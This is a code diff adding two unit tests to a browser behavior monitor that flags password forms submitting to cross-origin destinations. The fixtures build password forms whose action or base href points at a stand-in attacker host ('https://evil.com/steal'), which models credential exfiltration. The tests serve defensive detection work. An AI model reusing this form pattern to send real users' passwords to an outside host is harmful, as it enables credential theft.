@@ -330,6 +330,70 @@ describe("initJsBehaviorMonitor form submit detection", () => {
     );
   });
 
+  it("treats present-but-empty formaction as a document submit, not form-action inherit (#818)", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+
+    // Baseline the cross-origin form action BEFORE init so a dynamic-change
+    // signal cannot mask the effective-destination assertion below.
+    const form = document.createElement("form");
+    form.setAttribute("action", "https://evil.com/steal");
+    const pw = document.createElement("input");
+    pw.type = "password";
+    const button = document.createElement("button");
+    button.type = "submit";
+    button.setAttribute("formaction", "");
+    form.append(pw, button);
+    document.body.appendChild(form);
+
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    // Per the HTML spec (and the #650 contract), formaction="" submits to the
+    // document — same-origin, not dynamic (the form action attribute itself is
+    // unchanged since the baseline). Pre-fix the empty override fell through
+    // to the cross-origin form action and fired a bogus signal.
+    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));
+
+    expect(postSignal).not.toHaveBeenCalled();
+  });
+
+  it("resolves a relative formaction against the base href, not location (#818)", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+
+    const base = document.createElement("base");
+    base.setAttribute("href", "https://evil.com/app/");
+    document.head.appendChild(base);
+    try {
+      expect(document.baseURI).toBe("https://evil.com/app/");
+
+      initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+      const form = document.createElement("form");
+      form.setAttribute("action", "/login");
+      const pw = document.createElement("input");
+      pw.type = "password";
+      const button = document.createElement("button");
+      button.type = "submit";
+      button.setAttribute("formaction", "steal");
+      form.append(pw, button);
+      document.body.appendChild(form);
+
+      // The browser submits to https://evil.com/app/steal. Pre-fix the monitor
+      // resolved "steal" against location.href (same-origin) and stayed silent.
+      form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));
+
+      expect(postSignal).toHaveBeenCalledWith(
+        "ns-js-form-submit-suspicious",
+        expect.objectContaining({
+          isCrossOrigin: true,
+          destinationOrigin: "https://evil.com",
+        })
+      );
+    } finally {
+      // <base> lives in <head>, which the per-test body cleanup does not clear.
+      base.remove();
+    }
+  });
+
   it("does not stack submit listeners when initialized twice", () => {
     const postSignal = vi.fn<PostSignalFn>();
     initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
